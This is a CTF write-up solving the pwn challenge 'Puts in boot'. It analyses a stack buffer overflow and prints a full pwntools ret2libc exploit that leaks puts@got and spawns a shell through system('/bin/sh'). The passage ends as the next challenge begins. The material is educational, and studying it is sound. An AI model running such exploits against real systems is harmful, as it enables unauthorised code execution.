<h3> BIC DEFCON CTF 2023 </h3>

### Description: This was a fun ctf I did and it taught me new things >3

<h3> Challenge Solved: </h3>

## Pwn
-  Puts in boot
-  Karma
-  Dubdubdub
-  Shellstorm
-  Breakup

### Puts in boot [First Blood 🩸]

We are given a binary file attached to it

Checking the file type shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/89cb3511-2060-42f3-b332-c7ba455220ed)

We are working with a x64 binary which is dynamically linked and not stripped

From the result of checksec on this binary we can tell that the binary has no protection enabled on it

What looks interesting is the fact NX is disabled meaning that the stack is executable

And with that it's possible for us to place shellcode on the stack and execute it 

Anyways let us see what the binary does

Running it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ad11f512-9eb4-4138-8d9e-8578b3be4b16)

It receives our option prints out some words and exits

To understand the vulnerability in this binary I'll read the decompiled code 

Using ghidra I decompiled the binary 

Here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/36b3d5a5-589a-489c-8e92-0bc4b1cf6b2a)
```c

void main(void)

{
  do {
    AI();
  } while( true );
}
```

It calls the AI function while it returns true

Let us check the AI function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ab50d20-a781-45d5-bc59-bcebb03a7926)
```c
void AI(void)

{
  char buffer [79];
  char option;
  
  puts("Know of Andrej Karpathy?");
  puts(
      "A: I\'m sorry, who?\nB: Why should I?\nC: Uum, lemme Google and come back\nD: Ofcourse I do!"
      );
  fflush(stdout);
  __isoc99_scanf("%1s",&option);
  if (option == 'A') {
    puts("Andrej Karpathy!! You know, famous computer scientist?");
    puts("A: Yeah, no!\nB: Oooh yeeah!");
    fflush(stdout);
    __isoc99_scanf("%1s",&option);
    if (option == 'A') {
      puts("This Gen Alpha...lol. Tell me, what do you do in your free time if not learning ML?");
      fflush(stdout);
      getchar();
      fgets(buffer,0x100,stdin);
    }
    else if (option == 'B') {
      puts(
          "Yeah, that dude! We\'ll use his ML papers to get control of the world again. Be seeing yo u :)"
          );
    }
    else {
      puts("Sorry, invalid option. Let\'s try this again, shall we?");
    }
  }
  else {
    if (option == 'B') {
      puts("Why shouldn\'t you?");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (option == 'C') {
      puts("Sure. Learn a few things about him and come back :)");
    }
    else {
      if (option == 'D') {
        puts("Finally! Someone of culture!");
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      puts("Sorry, invalid option. Let\'s try this again, shall we?");
    }
  }
  return;
}
```

I won't explain what each option does but only the vulnerable section of the code as it's quite readable and understandable

The vulnerability in this program lies here:

```c
  char buffer [79];

  if (option == 'A') {
    puts("Andrej Karpathy!! You know, famous computer scientist?");
    puts("A: Yeah, no!\nB: Oooh yeeah!");
    fflush(stdout);
    __isoc99_scanf("%1s",&option);
    if (option == 'A') {
      puts("This Gen Alpha...lol. Tell me, what do you do in your free time if not learning ML?");
      fflush(stdout);
      getchar();
      fgets(buffer,0x100,stdin);
    }
```

It sets the buffer to hold up only 79 bytes and when option 'A' is chosen twice we get a prompt which receives our input and stores it in the buffer and we are allowed to write in 0x100 bytes 

With that there's a buffer overflow since the amount of bytes the buffer can hold up is 79

Now that we know that let us get the offset which is the amount of bytes required to overwrite the instruction pointer

I used gdb-gef for this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aa8f28e4-0ddc-4e48-8de1-1ab98674cbb3)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ab4da738-414e-4d78-8846-e146cefc5c56)

The offset is `88`

Now we need a way to exploit this binary to spawn a shell 

Remember that no mitigation is enabled so we can potentially perform ret2shellcode

But I don't feel like going through that since no easy gadget like `jmp rsp; ret`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8ffd82dc-ce8e-4fe1-9782-90f077230d8a)

So I'll go with ret2libc

Since plt of puts is available during the program execution we can potentially use that to leak the got address of puts
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a2b32b14-91ce-41d2-9899-09a7b10e9f1e)

Here's how my exploit will go:
- Leak GOT puts from libc
- Rop to system

In order to do this we need gadgets

And luckily the gadgets needed for the leak is available
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/56e07656-a99f-48d0-b14b-ced64e073bcc)

Why I need `pop rdi; ret` is because when `puts` is called to write values to stdout it requires a parameter to be passed 

The way parameters are passed in x64 is via registers so in this case we want to populate the rdi with the address of `puts@got`

Here's my exploit [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bicdefcon_23/puts_in_boot/exploit.py)

```python
#!/usr/bin/python3
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './puts_in_boots'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Load libc library (identified version from server - https://libc.blukat.me)
# libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')
libc = elf.libc

offset = 88
pop_rdi = 0x00000000004011d6 # pop rdi; ret; 
ret = 0x000000000040101a # ret; 


payload = flat({
    offset: [
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']
    ]
})

io.recvuntil('D: Ofcourse I do!')
io.sendline('A')
io.sendline('A')

# Leak address
io.sendline(payload) 
io.recvline()
io.recvuntil('ML?')
io.recvline()
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("got puts: %#x", got_puts)

# Calculate libc base
libc.address = got_puts - libc.symbols['puts']
info("libc_base: %#x", libc.address)

sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
info('/bin/sh: %#x', sh)
info('system: %#x', system)

# Payload to spawn shell
payload = flat({
    offset: [
        pop_rdi,
        sh,
        ret,
        system
    ]
})

io.sendline('A')
io.sendline('A')
io.sendline(payload)

io.interactive()
```

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6153b378-ce5c-48f1-a601-6bc705d591ce)

The remote instance isn't up so I can't do it remotely

But if it were up and we ran the exploit it won't work that's because the binary libc version is different from mine

That doesn't change the fact it won't be leaked

With that we can try to figure the libc being used remotely using this [site](https://libc.blukat.me/) 

And just search for puts address which I got to be `libc6_2.35-0ubuntu3.1_amd64.so`

With this I assumed that the other pwn challenges will be running on the same libc so if we eventually come across any challenge that requires leaking libc we won't need to worry about us figuring the remote libc 

### Karma [First Blood 🩸]

We are given a binary file attached to this challenge


